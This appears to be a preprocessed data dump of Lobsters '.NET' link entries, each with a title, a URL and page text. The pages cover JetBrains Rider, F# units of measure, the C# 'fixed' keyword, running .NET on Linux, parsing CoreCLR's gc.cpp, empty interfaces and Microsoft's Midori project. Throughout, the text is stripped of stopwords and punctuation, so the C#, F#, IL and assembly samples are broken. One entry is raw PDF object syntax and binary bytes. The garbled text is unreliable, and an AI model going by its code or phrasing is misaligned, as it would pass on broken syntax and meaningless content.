inherits number cool feature intellij feature rest test client rich version control support often life saving local history rider also includes datagrip rich database tooling mean open sql file get smart code completion onthefly analysis quickfixes across huge range database mysql postgresql sql server oracle load run query examine result even refactor database mentioning access intellij rich plugin ecosystem plugin sdk still development rider already support intellij resharper plugins rider take advantage existing intellij plugins vim editing mode check currently available plugins rider plugin repository site check hadi rider tip trick video ndc sydney example intellij platform help using rider use rider hopefully see made rider fully fledged ide utilising year experience functionality built intellij resharper product already got enormous amount functionality aiming build best ide experience net development want rider feature rich want fast owning entire ide stack deliver innovate area looked significantly improving experience searching nuget simplest answer download try see well work solution project remember rider built resharper codebase rider resharper new feature fix one product flow offering choice rider work well cross platform window great prefer visual studio rest assured resharper always help oh one last thing might noticed started journey codename project rider planning official name later well later honestly like name rider going welcome jetbrains rider download first public rider eap build web site fire toolbox rider going well
460,Lobsters,dotnet,"C#, F#, .NET programming","Visual Studio Pre-Release Downloads (Visual Studio for Mac, Visual Studio 2017 RC)",https://www.visualstudio.com/visual-studio-pre-release-downloads/,visual studio prerelease downloads visual studio mac visual studio rc,,tell u project help find right download tutorial
461,Lobsters,dotnet,"C#, F#, .NET programming",F# Units of Measure,https://docs.microsoft.com/en-us/dotnet/articles/fsharp/language-reference/units-of-measure,f unit measure,unit measure article syntax using generic unit creating aggregate type generic unit unit runtime conversion microsoftfsharpcorelanguageprimitives floatwithmeasure unit measure f core library see also,unit measure minute read article floating point signed integer value f associated unit measure typically used indicate length volume mass using quantity unit enable compiler verify arithmetic relationship correct unit help prevent programming error syntax measure type unitname measure previous syntax defines unitname unit measure optional part used define new measure term previously defined unit example following line defines measure cm centimeter measure type cm following line defines measure ml milliliter cubic centimeter measure type ml previous syntax measure formula involves unit formula involve unit integral power supported positive negative space unit indicate product two unit also indicates product unit indicates quotient unit reciprocal unit either use negative integer power indicates separation numerator denominator unit formula multiple unit denominator surrounded parenthesis unit separated space interpreted part denominator unit following interpreted part numerator use unit expression either alone indicate dimensionless quantity together unit numerator example unit rate would written indicates second parenthesis used unit formula specify numeric conversion constant unit formula however define conversion constant unit separately use unitchecked computation unit formula mean thing written various equivalent way therefore compiler convert unit formula consistent form convert negative power reciprocal group unit single numerator denominator alphabetizes unit numerator denominator example unit formula kg kg converted kg use unit measure floating point expression using floating point number together associated unit measure add another level type safety help avoid unit mismatch error occur formula use weakly typed floating point number write floating point expression us unit unit expression must match annotate literal unit formula angle bracket shown following example cm mileshour put space number angle bracket however include literal suffix f following example f indicates singleprecision floating point mileshour annotation change type literal primitive type float dimensioned type float cm case float mileshour unit annotation indicates dimensionless quantity type equivalent primitive type without unit parameter type unit measure floating point signed integral type together extra unit annotation indicated bracket thus write type conversion g gram kg kilogram describe type follows let x float g x gkg unit measure used compiletime unit checking persisted runtime environment therefore affect performance unit measure applied type floating point type however floating point type signed integral type decimal type support dimensioned quantity therefore make sense use unit measure primitive type aggregate contain primitive type following example illustrates use unit measure mass gram measure type g mass kilogram measure type kg weight pound measure type lb distance meter measure type distance cm measure type cm distance inch measure type inch distance foot measure type ft time second measure type force newton measure type n kg pressure bar measure type bar pressure pascal measure type pa n volume milliliter measure type ml volume liter measure type l define conversion constant let gramsperkilogram float g gkg let cmpermeter float cmm cmm let cmperinch float cminch cminch let mlpercubiccentimeter float let mlperliter float mll mll define conversion function let convertgramstokilograms x float g x gramsperkilogram let convertcentimeterstoinches x float cm x cmperinch following code example illustrates convert dimensionless floating point number dimensioned floating point value multiply applying dimension abstract function like degreesfahrenheit also pas dimensioned value function expect dimensionless floating point number must cancel unit cast float using float operator example divide degc argument printf printf expects dimensionless quantity measure type degc temperature celsiuscentigrade measure type degf temperature fahrenheit let convertctof temp float degc degf degc temp degf let convertftoc temp float degf degc degf temp degf define conversion function dimensionless floating point value let degreesfahrenheit temp temp degf let degreescelsius temp temp degc printfn enter temperature degree fahrenheit let input systemconsolereadline let parsedok floatvalue systemdoubletryparse input parsedok printfn temperature celsius degree c convertftoc degreesfahrenheit floatvalue degc else printfn error parsing input following example session show output input code enter temperature degree fahrenheit temperature degree celsius using generic unit write generic function operate data associated unit measure specifying type together generic unit type parameter shown following code example distance meter measure type time second measure type let genericsumunits x float u float u x let m let m let let ok function unit consistency checking let genericsumunits error reported mismatched unit uncomment see error let genericsumunits creating aggregate type generic unit following code show create aggregate type consists individual floating point value unit generic enables single type created work variety unit also generic unit preserve type safety ensuring generic type one set unit different type generic type different set unit basis technique measure attribute applied type parameter distance meter measure type time second measure type define vector together measure type parameter note attribute applied type parameter type measure u x float u float u z float u create instance two different measure create position vector let xvec x z create velocity vector let m x m m z m unit runtime unit measure used static type checking floating point value compiled unit measure eliminated unit lost run time therefore attempt implement functionality depends checking unit run time possible example implementing tostring function print unit possible conversion convert type unit example float u type unit use standard conversion function example use float convert float value unit shown following code measure type cm let length cm let x float length convert unitless value value unit multiply value annotated appropriate unit however writing interoperability layer also explicit function use convert unitless value value unit microsoftfsharpcorelanguageprimitives module example convert unitless float float cm use floatwithmeasure shown following code open microsoftfsharpcore let height float cm languageprimitivesfloatwithmeasure x unit measure f core library unit library available fsharpdataunitsystemssi namespace includes si unit symbol form like meter unitsymbols subnamespace full name like meter meter unitnames subnamespace see also
462,Lobsters,dotnet,"C#, F#, .NET programming",Thinktecture RelayServer – Open Source SignalR Based API-Relay,https://github.com/thinktecture/relayserver,thinktecture relayserver open source signalr based apirelay,thinktecture relayserver english documentation vorteile de relayservers architektur installation und management thinktecturerelayserverdocumentationde sponsoren sponsoren au deutschland sponsoren au der schweiz,thinktecture relayserver english documentation der thinktecture relayserver nachfolgend kurz relayserver genannt ermöglicht al opensourcesoftware eine bidirektionale sichere kommunikation von client mobilen endgeräten und applikationen mit onpremisesapplikationen hinter routern und firewall über da httpsprotokoll bei vollständiger zentraler kontrolle und auditierung der zulässigen teilnehmer und der erlaubten daten ein für clientanwendungen und onpremisesapplikationen gleichermaßen erreichbarer server bildet einen sicheren austauschpunkt für nachrichten und daten da der server unter der vollen kontrolle de betreibers steht und sowohl mit client al auch onpremisesapplikationen durchgängig verschlüsselt kommuniziert ist die sicherheit der übertragenen daten jederzeit gewährleistet die positionierung de relayservers im öffentlichen internet sorgt weiterhin dafür das sowohl client al auch onpremisesapplikationen nur ausgehende verbindungen zur kommunikation aufbauen müssen damit sind firewall router und natsysteme der regel ebensowenig ein problem wie häufig wechselnde ipadressen von einfachen dslanschlüssen oder mobilfunkverbindungen vorteile de relayservers opensourcesoftware vollständige datenhoheit liegt beim betreiber de relayservers al reine softwarelösung schnell implementierbar für die clientsoftware sind keine library notwendig die lösung ist mandantenfähig das über einen relayserver daten für mehrere verschiedene onpremisesapplikationen und deren client fließen können firewall nat und proxy stellen der regel kein problem dar der transportkanal ist via httpsverbindung verschlüsselt die onpremisesapplikation benötigt al minimalanforderung eine offene ausgehende httpsverbindung keine spezielle hardware notwendig keine firewalländerungen notwendig keine datenhaltung einer dmz notwendig architektur installation und management eine vollständige dokumentation zum relayserver inklusive aller detail zu seiner architektur einer ausführlichen installationsanleitung und einer einführung da relayserver management web befindet sich unter thinktecturerelayserverdocumentationde sponsoren da ziel dieser sponsorenliste ist e unternehmen hervorzuheben die sich technisch undoder finanziell diesem opensourceprojekt beteiligen weil e ihnen hilft bei ihren eigenen projekten zeit und geld zu sparen sponsoren au deutschland sponsoren au der schweiz
463,Lobsters,dotnet,"C#, F#, .NET programming",How does the ‘fixed’ keyword work?,http://www.mattwarren.org/2016/10/26/How-does-the-fixed-keyword-work/,fixed keyword work,fixed keyword work compiler roslyn unit test clr role localrewriterfixedstatementcs pinned identifier standard common language infrastructure cli pinned pinned pinned pinned pinned net il assembler paperback serge lidin google book clr method string clr jitter creates every method correct magic flag aside support inlining method pinned local garbage collector compact phase clr garbage collection inside maoni stephen class using gc efficiently part need pin thing keep mind summary rprogramming reading,fixed keyword work oct word well turn really nice example collaboration main part net runtime list component involved could argue required execute c code interesting fixed keyword specific part play compiler start let look one basic scenario using fixed keyword directly accessing content c string taken roslyn unit test using system unsafe class c static unsafe void main fixed char p hello consolewriteline p compiler turn following il code size maxstack local init char p pinned string nop ldstr hello convi brfalses call int systemruntimecompilerservicesruntimehelpersoffsettostringdataget add nop call void systemconsolewriteline char nop nop ldnull ret note pinned string compiler created u made hidden local variable hold reference object using fixed statement case string hello purpose pinned local variable explained moment also emitted call offsettostringdata getter method systemruntimecompilerservicesruntimehelpers cover detail discus clr role however aside compiler also performing optimisation u normally would wrap fixed statement finally block ensure pinned local variable nulled control leaf scope case determined leave finally statement entirely localrewriterfixedstatementcs roslyn source principle cleanup code ie nulling pinned variable always finally block however optimize finally away keeping cleanup code case following true branch fixed statement fixed statement try block syntactic synthesized isintryblock node hasgotoout rewrittenbody pinned identifier let start looking authoritative source standard common language infrastructure cli pinned signature encoding pinned shall appear signature describe local variable method pinned local variable executing f shall relocate object local refers implementation cli us garbage collector move object collector shall move object referenced active pinned local variable rationale unmanaged pointer used dereference managed object object shall pinned happens example managed object passed method designed operate unmanaged data end rationale f virtual execution system cli common language infrastructure ct common type system prefer explanation human readable form ie spec extract net il assembler paperback serge lidin helpful also available google book clr arguably clr easiest job accept exists separate component jit gc job provide offset raw string data via offsettostringdata method emitted compiler might thinking method complex calculation determine exact offset nope hardcoded told string clr special relationship public static int offsettostringdata offset baked string indexer intrinsic harm getting baked well systemruntimeversioningnonversionable get number byte address pointed reference string first character string skip methodtable pointer string length course string reference point memory sync block nt count property allows c fixed statement work string bit platform bit return else return endif jitter fixed keyword work role jitter provide information gcruntime lifetime variable within method inparticular pinned local via gcinfo data creates every method see action enable correct magic flag see following compiling consoleapplicationprogram main il size assembly listing method consoleapplicationprogram main ref emitting blendedcode cpu avx optimized code rsp based frame partially interruptible final local variable assignment ref zeroref long rcx ref mustinit pinned long rcx outargs lclblk lcl frame size sub rsp xor rax rax mov qword ptr rax mov rcx gword ptr hello mov gword ptr rcx mov rcx gword ptr test rcx rcx je short add rcx movzx rcx word ptr rcx call systemconsole writeline char xor rax rax mov gword ptr rax add rsp ret total byte code prolog size method consoleapplicationprogram main ref set code length set outgoing stack arg area size stack slot id offset sp pinned untracked defining call site offset size see section titled final local variable assignment indicated variable mustinit pinned bottom text stack slot id offset sp pinned untracked aside jit also done extra work u optimised away call offsettostringdata inlining assembly code add rcx slightly related note previously fixed keyword prevented method inlined recently changed see support inlining method pinned local full detail garbage collector finally come gc important role play play depending way look effect gc get way leave pinned local variable alone lifetime method normally gc concerned object live dead know clean pinned object go one step must clean object must move around generally gc like relocate object around compact phase make memory allocation cheap pinning prevents object accessed via pointer therefore memory address remain great visual explanation look like excellent presentation clr garbage collection inside maoni stephen click fullsized version note pinned block marked p remained forcing gen segment start awkard location pinning many object keeping pinned long cause gc overhead perform extra booking keeping work around reality using fixed keyword object remain pinned short period time ie control leaf scope pinning object via gchandle class lifetime could longer finish let get final word pinning maoni stephen using gc efficiently part read blog post detail need pin thing keep mind pinning short time cheap pinning older object harmful pinning young object creating pinned buffer stay together instead scattered around way create fewer hole summary simple really main part net runtime bit get use handy feature let u dropdown perform baremetal coding discus post rprogramming reading read far might find link useful
464,Lobsters,dotnet,"C#, F#, .NET programming",".NET on Linux – bye, Windows 10",http://piotrgankiewicz.com/2016/10/17/net-on-linux-bye-windows-10/,net linux bye window,net core linux mint install visual studio code resharper omnisharp project rider docker microservices cqrs nginx visual studio written piotr gankiewicz,eventually decided start using nix system software development window user net developer many year might seem like radical change let tell great decision explanation first really short introduction friday october working something office window popup came nowhere saying minute left period install update nothing maybe minute later could see laptop shutting already update installed took almost hour middle day work yeah screw window window nowhere update however decision made purely based emotion honestly latest project needed device touchscreen lenovo yoga user probably bought macbook instead guess one day apple make macbook touchscreen call revolutionary another story still window un fortunately pc due fact need migrate project net core however laptop use work totally wipe anything related microsoft system installed linux mint mint know people internet said new linux remember command though good old time university pick one instead ubuntu hard feeling bro manage install fresh system laptop disable uefi create valid partition special flag etc took figure yet difficult installation part really quick within minute already able login brand new o brand new linux mint first thing install net core framework almost simple written page almost missing dependency net core preview library resolved google framework running finally able build run one application worked worked one thing causing issue reference systemdrawing projectjson although application run correctly threw exception gdiplusdll could found make sense window component available linux point although net core application still crash imagine would happen publish linux server everything would seem work actually another point net core development linux instead window installing tool service git mongodb redis slack skype etc decide want write actual code big fan visual studio code using one mostly javascript development everything related c however doubt productivity eg without resharper turned great extension called omnisharp also use atom bracket sublime even vim work well v code surely visual studio resharper use basic well important feature find file methodtype rename go definition display reference also tried use project rider luck load solution correctly internal exception caused resharper built ide really build project able write code shortcut work either however believe jetbrains fix bug best crossplatform ide available net development wait happen last least nothing simple bash script solve term project automation running testing visual studio code omnisharp way go last part docker story planning put hand docker quite time play little bit past find real use project yet thing different since started developing application using microservices cqrs pattern seems like good idea make use docker image container another advantage using linux instead window software development process linux natural environment docker work machine sure work remote server able run docker window need use hyperv virtualbox try run docker build would throw error due system variable path need take care running docker window oh guess forget mention able run aurelia application linux built window path ending aureliajson file replace make work linux course work window well even going mention great nix bash setting nginx ssl certificate reverse proxy redirection simple running docker natural part ecosystem sum trying say window good software development example visual studio probably hard beat many year amongst many great tool point tied specific technology cross platform usually mean window user might want give try environment always good thing try something new hone skill broaden horizon written piotr gankiewicz microsoft mvp bottega trainer software engineer architect noordwind cofounder open source contributor speaker motorcyclist athlete
466,Lobsters,dotnet,"C#, F#, .NET programming",Parse A Monster [nice writeup of finding a bug in .NET's CLR c++ parser],http://www.empear.com/blog/parse-a-monster/,parse monster nice writeup finding bug net clr c parser,day parsed monster need monster tool software analysis software evolution series hotspot example coreclr hotspot identifies complicated code also work often challenge complex language torturing c compiler file gccpp massive github render syntax highlightning look microgrammars le cyclomatic complexity catching bug gccpp walk bug microgrammar found coreclr project complexity trend function level reveals hotspot inside gccpp keep accumulating complexity try analysis code onprem service,day parsed monster september today patched monster monster piece code many probably rely upon either directly indirectly talking garbage collector net core runtime microsoft critical piece code never intended touch reason ended hunt good test data analysis tool explored interesting approach write efficient parser story much bug found trivial fix instead want share example simplify complex problem rethinking need monster apollo program often claimed humanity greatest engineering achievement clear anyone make claim never looked c compiler complexity c compiler make landing moon look easy halfjoking since spent past week implementing c parser probably wonder earth would someone parse c land moon already highquality c parser course thing needed parser order magnitude faster take challenge let explain develop tool software analysis analysis bit different since focus evolution codebase rather static snapshot code example given large codebase hundred developer prioritize improvement technical debt actually matter software evolution provides critical part answer question like concept hotspot central part analysis hotspot complicated code need work often hotspot based actually work code static property long time presented hotspot file level case hotspot give information act upon however sometimes come across hotspot file several thousand line code point someone let say file line code say hey problem refactor module fine helpful hence started work xray feature introduced software r evolution series hotspot example coreclr hotspot identifies complicated code also work often xray let identify hotspot inside file resolution functionmethod level pull need analyze source code explains interest parser let meet challenge challenge complex language programming language differ lot syntax example lisp language family trivial parse since lisp minimalistic uniform syntax end spectrum find c c notoriously hard expensive parse particularly true modern c make heavy use template metaprogramming torturing c compiler living seen compilation time go roof point become serious productivity bottleneck performance impact hit tool harder make lot pass file reason analyze evolution code mean need parse historic revision file large hotspot may hundred revision performance hit add quick first approach parsing c use complete language grammar c write unit test different corner case prefer rely realworld production data test found approach give return time invest test since c many style flavor tested lot different open source project also managed find excellent measurement stick performance gccpp net core runtime gccpp c file around line code fact big github refuse render code file gccpp massive github render syntax highlightning line code would scary language c lowlevel abstraction manual memory management becomes true monster encourage take quick look code wait please go ahead look gccpp particularly object oriented case c used bjarne stroustrup label better c yes u would like add definition better slightly stronger type system basic class gccpp critical code term performance correctness error impact million user software system kind code really impressive downright scary time first attempt fullblown c parser failed miserably first gccpp took forever parse forever case mean minute since revision gccpp parse became quite impractical addition real parser play well macro preprocessor directive adding support option since end even worse performance better lead investigate novel strategy based something called microgrammars let see microgrammar microgrammars le often get asked different company simplify code course lot different strategy important one start end start problem found simplifying problem try solve much higher payoff focusing solution applied lesson tried improve c parser approach based concept called microgrammars let give example want get approximation complex piece code could calculate cyclomatic complexity mean need count number branch loop function microgrammars simplify problem realizing code important u let say attempt parse ifstatement detailed conditional statement carry additional information free ignore detail microgrammar embrace fact parse general structure conditional logical boolean expression discarding detail suitable microgrammar approach massively simplifies parsing complete c grammar consisted line tricky rule rewrote microgrammar approach reduced rule set line code line include lexer parser rule reduction size complexity make wonder ability reason code line something build mental model hence reason big win moved optimize grammar rule hard optimize code reason reduction cognitive effort needed understand code big win critical win respect runtime performance using microgrammar approach able parse gccpp millisecond order magnitude faster important fast enough tool provide good user experience please note implementation clojure exactly known blazing speed interesting however get significant performance increase rethinking problem rather traveling abstraction ladder reimplement code lowlevel language even surprising microgrammar good enough detect bug gccpp real parser miss let explain catching bug gccpp far praised microgrammar approach however want pointout writing microgrammar necessarily easy trick particular respect performance minimize look ahead micro parser mean need keep grammar general enough agnostic large part language time specific matter tradeoff also reason micro parser hard work tradeoff c conditional compilation strip away conditional compilation statement since would lead invalid coding construct like unbalanced curly brace case aware conditionals found bug gccpp celebrated performance victory realized got warning parser error handling strategy report parse failure try resynchronize next recognized parse token warning got complained extraneous closing curly brace suspected glitch parse rule spend time debugging looked test code finally found walk bug microgrammar found see code moment someone undefines backgroundgc code compile anymore try good citizen found bug patched error submitted pull request coreclr project patch trivial interesting whats interesting though bug trivial hidden undetected long time critical welltested peer reviewed codebase first take away software incredibly hard get right also fascinating case microgrammar catch problem full scale compiler might miss preprocessing really part c compiler second take away relates microgrammar rethinking problem managed significantly reduce complexity code big runtime performance leave xray result gccpp well microgrammar able analyze whole evolution file answer question top hotspot function level function gcheap growbrickcardtables function line code data indicates simplification code likely make future maintenance cheaper since function part development effort gccpp past year addition see hotspot gcheap growbrickcardtables becomes complicated time complexity trend function level reveals hotspot inside gccpp keep accumulating complexity try analysis code provide analysis onprem service signup explore hotspot codebase codesceneio free open source project bug c xray feature know blame adam tornhill september
468,Lobsters,dotnet,"C#, F#, .NET programming",Classes for the Masses,http://www.mlworkshop.org/2016-7.pdf,class mass,,obj goto endobj obj introduction endobj obj goto endobj obj representation endobj obj goto r fit endobj obj length filter flatedecode stream k yq r p ȑ φ lh l v jy h n uag aaqkg kbe e w na g خݹ ۼ u endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r endobj obj type annot subtype link border hic rect goto citepeytonjones endobj obj type annot subtype link border hic rect goto citewadlerblott endobj obj type annot subtype link border hic rect goto citescalaimplicits endobj obj type annot subtype link border hic rect goto citecppconcepts endobj obj type annot subtype link border hic rect goto citerust endobj obj type annot subtype link border hic rect goto citeswift endobj obj type annot subtype link border hic rect goto citegenericspldi endobj obj type annot subtype link border hic rect goto citegenericspopl endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r r r r procset pdf text endobj obj length filter flatedecode stream e τ vb z f z r p g nl zz qߢ ŏ u dr ݦi endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r endobj obj type annot subtype link border hic rect goto citenatural endobj obj type annot subtype link border hic rect goto citeroslynfork endobj obj type annot subtype link border hic rect goto citeroslyn endobj obj type annot subtype link border hic rect goto citecppconcepts endobj obj type annot subtype link border hic rect goto citefshack endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r r r procset pdf text endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj length filter flatedecode stream l g gksc bj vv jc k v eh e q 疄 ƶ l w j h iv c e c kg c p z e 趱q rm q ǒp w ψ h j pj b b f vz g eq wm b e v hm z scl r e k aǔ du r 裤 c endstream endobj obj type fontdescriptor fontname flag fontbbox ascent capheight descent italicangle stemv xheight charset cdhiotabcdefhiklmnoprstuvy fontfile r endobj obj length filter flatedecode stream ooof h et x c xr z l ǚ fx cz gk v u mh j f kh e z v ϻ jp v l g tu k ف hyjae bi l h dt yv cy θ p v ӝ e r j z xh l f pפh у tc h z pe p bx ɞ n e ը ݒbkau q z u xe
470,Lobsters,dotnet,"C#, F#, .NET programming","Managing Complexity - Or ""Why do you code in F#?""",https://anthonylloyd.github.io/blog/2016/09/09/managing-complexity,managing complexity code f,managing complexity code f elm architecture presentation discovered reason,managing complexity code f sep post outline view often overlooked misunderstood topic managing complexity software development answer question asked sometimes prefer develop system f strongly typed functionalfirst language next time someone asks refer nt program language like c better performance functional programming would want use nt hard hire f developer would nt easier stick standard c use something like python lot library quickly build thing answer want reduce control complexity simplicity flexibility brings increase chance discovering best abstraction domain classic example everything file unix find domain put street ahead minimising inherent complexity domain simplicity ultimate sophistication leonardo da vinci software language framework bring different degree accidental complexity problem solving simple enough handle additional complexity sure always case primary cause software project failure complexity roger session use functional language longer list pattern consider excessive accidental complexity object oriented programming gof pattern solid pattern null exception circular dependency test rather type object relational mapping dependency injection dynamic weak type system mutable domain model framework rather library databinding mvvm since learning elm architecture attempt reduce complexity trend building system batch data transformation script moving microservices nt reduce complexity dramatically increase distributed system harder reason change able scale make sense done great skill simplicity prerequisite reliability edsger w dijkstra rich hickey brilliant presentation explaining difference simple easy software development every software developer need watch also entertaining key takeaway simplicity choice ignoring complexity slow long term throwaway trivial project nothing much matter information simple nt ruin hiding behind microlanguage ability reason program critical guard rail programming ie test rather type simple help get want go let say c faster f given algorithm experience getting best algorithm produce order magnitude increase performance seen system become complicated even though better algorithm known ca nt used would require large rewrite complexity limit reached particularly true many c quant library using high level functional language ten time le code provides simplicity explore better algorithm use generic performance technique asynchronous programming memoization performance complicated often movement data calculation prefer start highest level language f move algorithm lowest level language c last resort often need rarely really access chip optimised linear algebra optimisation library functional programming simplefirst programming functional programming simple come mathematics simplest possible programming construct nt understand category theory benefit functional language discovered invented many work language invented show prof philip wadler functional programming fad profession ignore rigorous mathematical foundation mean around forever software developer encouraged learn benefit provides data simple especially true strong type system support union type illegal state made unrepresentable pure function simple always give output input easy reason test object complex fuse data function side effect hold link object hard almost impossible reason testing painful software developer become familiar codebase hold large model system head nt let go holiday handle query calculation possibly long running mutable domain model concurrent collection cross domain locking created bug paradise get cosy settle long term domain work number statistic risk attribution backtesting analysis changing state slightly comparing result calculation would mutable domain model locking transaction clone world visitor pattern would nt wish anyone something missing perfect data pure function beautiful system functional programming allows function passed around like data function accept function input generic way called higherorder function may sound alien provides quantum leap term code reuse assembling system fact nt understand full power code reuse started programming functional language object orientated programming poorer method assembling system object given object dependency injection invented make easier help result system harder reason increase complexity need talk object oriented programming pattern work around deficiency taken limit make look functional every release java c add functional feature unfortunately ultimately fix language increase complexity industry need decide move one short term simple project handle additional complexity exchange quick productivity gain python rail r etc great long term critical system evolve time focus must simplicity programming language tool need help u code f
471,Lobsters,dotnet,"C#, F#, .NET programming",“Are empty interfaces code smell?”,https://medium.com/@ssg/are-interfaces-code-smell-bd19abc266d3,empty interface code smell,empty interface code smell earlier user programming stackoverflow empty interface code smell edit marker interface visitor pattern result hacker noon ami accepting submission discus advertising sponsorship read page likemessage u facebook tweetdm hackernoon latest tech story trending tech story,empty interface code smell one earlier user stackoverflow back asked programmingrelated question five year fiftythree upvotes nine star later today noticed got closed primarily opinionbased got nominated deletion never notified happening content created believed would existed web accessible forever naive coursei like stackoverflow lot find invaluable like contributing like moderation culture accept would appreciated headsup though giving away work creativecommons license free mean give value adhere stackoverflow rule mean value either anywayi want question lost although going discarded primarily opinionbased think value opinion moving question case get lost going move answer know author would okay might cclicensed imply fine whatever happening work rather going mention ideasthe question guessed empty interface code smell full text function return kind object query result property method common order common type resorted using empty interface return type implemented boththat sound right course console clinging hope someday class something common move common logic empty interface yet satisfied thinking whether two different method conditionally call next would better approach also told net framework us empty interface tagging purposesmy question empty interface strong sign design problem widely used edit interested later found discriminated union functional language perfect solution trying achieve c seem friendly concept yetthe question worded best way say least ambiguous needed answer couple followup question clarify problem received valuable comment answer accepted answer mention marker interface elaborate opinion subject quote article linksi okay empty interface long time marker interface man yeah couple week ago something clicked found problem code euphoric eureka moment yes turned interface fact code smell finally figured correct design itlet clarify problem first going try give simplified example twitter writing twitter scratch c like c web db layer separate project search query function db layer iqueryresult query string input depending user type search box query function return different iqueryresult instance start return userprofileresult regular text return searchqueryresult empty return validationerrorresultdepending result object type controller web layer different thing validationerrorresult render standard validation error nothing else userprofileresult redirects user profile searchqueryresult redirects search pagethe problem neither type common property functionality validationerrorresult errormessage userprofileresult userid searchqueryresult keyword ended interface iqueryresult guiltridden hack came dare abomination object query string keyword teenyweeny bit type safety could sure query could return anything object implemented iqueryresult end web layer code turned like var result dbquery input result validationerrorresult var validationresult validationerrorresult result return rendererror result searchqueryresult var searchresult searchqueryresult result return redirect search new q searchresultkeyword result userprofileresult var profileresult userprofileresult result return redirect profile new user profileresultuserid see lie course query method could start returning new iqueryresult type handled typesafety illusion iti bothered sequential type check cast could optimize slightly operator null check sequential check regardless every time twitter user request would extra work unnecessarily proper objectoriented programming efficient fast flexible yet prone error wrong wanted illusion back db web layer isolated implemented rendererror validationerrorresult db layer access anything web implemented redirection either db know thing stick ugly check terribleobjectoriented programming mostly virtual dispatch looking stuff reach correct code nifty feature like inheritance polymorphism otherwise bother right interface like outlet run whatever plug long thing supported outlet standard needed fact outlet db layer plug later whatever functionality wanted something like interface iqueryresult void visit iqueryresultvisitor visitor interface iqueryresultvisitor void visitvalidationerror validationerrorresult result void visituserprofile userprofileresult result void visitsearchquery searchqueryresult result class userprofileresult iqueryresult void visit iqueryresultvisitor visitor visitorvisituserprofile class validationerrorresult iqueryresult void visit iqueryresultvisitor visitor visitorvisitvalidationerror class searchqueryresult iqueryresult void visit iqueryresultvisitor visitor visitorvisitsearchquery finally reinvented visitor pattern eureka course knew visitor pattern used place never subconsciously linked type problem one reason somehow think could get return value void function remembered object contained state controller code would like var result dbquery input var visitor new queryresultvisitor thiscontext resultvisit visitor return visitorresult need result interface signature needed implementation class queryresultvisitor iqueryresultvisitor actionresult result get private set private icontrollercontext context queryresultvisitor icontrollercontext context thiscontext context void visitvalidationerror validationerrorresult result thisresult contextrendererror resultmessage void visituserprofile userprofileresult result thisresult contextredirect profile new user resultuserid void visitsearchquery searchqueryresult result thisresult contextredirect search new q resultkeyword much le cumbersome look well much look obviously moodkilling mundane work especially think benefit implementing db class suddenly start support different client different behavior pattern get benefit compiletime check force implement missing part add new result type controller code get simplified couple line fast scalable mapping operationmore importantly awkward empty interface suddenly becomes functional yay elephant room gone goodfor sake completeness could solved problem discriminated union functional programming language like haskell f rusty syntax would come f lookingcode type queryresult validationerror string searchquery string userprofile intlet query text queryresult query code controller code becomes something like let result dbquery inputmatch result validationerror v rendererror v searchquery redirect search dict q userprofile p redirect profile dict user p involves much le boilerplate trivial understand provides better compiletime check differently switch statement imperative language added new result type compilation would fail unhandled case sure would fast would involve much le wiring surei bring use functional language production yet except xslt count switch quite big leap lot gotchas least glad satisfactory solution empty interface domain imperative language finally bring closure question keep away reach hammer moderation enjoyed even better tl dr end empty interface generic return type see opportunity use visitor patternps although got triggered moderator time considering moving material wrote programming platform similar extended commentary medium let know sound like good idea hacker noon hacker start afternoon part amifamily accepting submission happy discus advertising sponsorship opportunitiesto learn read page likemessage u facebook simply tweetdm hackernoonif enjoyed story recommend reading latest tech story trending tech story next time take reality world granted
473,Lobsters,dotnet,"C#, F#, .NET programming",Safe Systems Programming in C# and .NET,https://www.infoq.com/presentations/csharp-systems-programming,safe system programming c net,infoq homepage presentation safe system programming c net summary bio conference key takeaway show note midori system c c talk focus performance code generation optimization inlining range analysis stack allocation memory garbage collection garbage collection pitfall c value string array span pack zero copy reliability failfast contract asserts immutability language mentioned people mentioned see presentation show note,infoq homepage presentation safe system programming c net safe system programming c net summary joe duffy share key experience building entire operating system c dialect focus area like garbage collection lowlevel code quality dealing error concurrency robustly example focus specifically using open source c net project exist today bio joe duffy director engineering compiler language group microsoft role lead team building c c vb f language compiler static analysis platform across many architecture platform group began responsible element taking net crossplatform open source book patent love thing code conference software changing world qcon empowers software development facilitating spread knowledge innovation developer community practitionerdriven conference qcon designed technical team lead architect engineering director project manager influence innovation team key takeaway security worse ever buffer overrun account approximately known day vulnerability safety important ever performance bottleneck largely shifted elsewhere garbage collection time expensive io also worse expand consume available space copy memory needlessly byte almost always sign danger c delivers productivity safety still delivering good performance jit aot everything show note midori midori operating system use window linux written c took year build included device driver web server library compiler garbage collection midori researchincubation project never intent replace window regardless medium said around half midori team moved developer division microsoft compiler language group eventually spun c c team took learning midori team new team order drive innovation system system anywhere apt think bit byte 